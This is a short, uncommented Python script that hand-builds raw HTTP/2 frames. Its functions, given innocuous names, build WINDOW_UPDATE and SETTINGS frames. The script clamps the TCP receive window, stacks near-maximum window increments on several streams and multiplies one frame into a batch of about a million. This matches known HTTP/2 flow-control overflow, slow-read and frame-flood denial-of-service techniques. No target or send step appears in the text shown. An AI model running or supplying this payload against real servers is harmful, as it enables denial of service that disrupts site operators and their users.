import socket
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
ceiling = 1048575
def frame(kind, flags, stream, data=b""):
    return len(data).to_bytes(3, "big") + bytes((kind, flags)) + stream.to_bytes(4, "big") + data
def credit(stream, value):
    return frame(8, 0, stream, value.to_bytes(4, "big"))
def tune(value):
    return frame(4, 0, 0, b"\0\4" + value.to_bytes(4, "big"))
raw = socket.socket()
raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, 1024)
event = (credit(0, 1792) + credit(0, ceiling)
         + credit(149, ceiling - 1) + credit(151, ceiling - 1)
         + tune(2) + credit(0, ceiling))
maximum = credit(0, ceiling)
batch = maximum * (1 << 20)
